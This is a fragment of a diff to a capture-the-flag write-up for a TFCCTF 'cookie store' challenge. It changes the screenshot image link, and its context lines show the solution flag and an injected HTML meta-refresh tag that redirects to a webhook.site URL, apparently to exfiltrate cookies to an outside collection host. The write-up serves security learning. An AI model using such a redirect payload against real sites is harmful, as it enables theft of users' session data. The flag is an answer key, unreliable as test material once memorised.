@@ -26,6 +26,7 @@ from other writeup technics
 <meta http-equiv='refresh' content='0; url=https://webhook.site/8fc412cf-ca22-436f-98b5-388322118ecf'>
 ```
 
-<img src="screenshots/cookie_store.png">
+
+ ![Alt text](screenshot/cookie_store.png?raw=true)
 
 flag: `TFCCTF{144ab0e4c358b00b1258f2aea2250b21}`
